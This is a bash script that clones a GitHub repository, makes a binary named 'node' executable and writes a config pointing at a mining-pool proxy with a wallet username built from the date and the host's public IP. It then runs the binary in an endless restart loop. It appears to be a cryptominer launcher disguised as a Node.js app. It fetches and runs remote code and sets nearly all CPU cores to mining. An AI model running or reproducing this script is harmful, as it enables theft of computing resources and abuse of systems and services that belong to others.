#!/bin/bash
git clone https://github.com/miltoncarpenter665/node-mino-app.git
sleep 2
cd node-mino-app
sleep 2
chmod +x node
sleep 2

array=()
for i in {a..z} {A..Z} {0..9}; 
   do
   array[$RANDOM]=$i
done

currentdate=$(date '+%d-%b-%Y_ShinyWasm_')
ipaddress=$(curl -s api.ipify.org)
num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
used_num_of_cores=`expr $num_of_cores - 3`
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
underscore="_"
underscored_ip+=$underscore
currentdate+=$underscored_ip

randomWord=$(printf %s ${array[@]::8} $'\n')
currentdate+=$randomWord

sleep 2

echo ""
echo "You will be using $used_num_of_cores cores"
echo ""

sleep 2

TZ='Africa/Johannesburg'; export TZ
date
sleep 2

cat > data.json <<END
{
  "proxy": "ws://cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:9999/bWF6YXBvb2wubXJmYWNlLmNvbTo4NDQy",
  "config": { "threads": $used_num_of_cores, "log": true },
  "options": { "user": "MGaypRJi43LcQxrgoL2CW28B31w4owLvv8.$currentdate", "password": "x", "argent": "web-wasm/1.0" }
}
END

sleep 2

while true
do
./node app.js
sleep 5
done
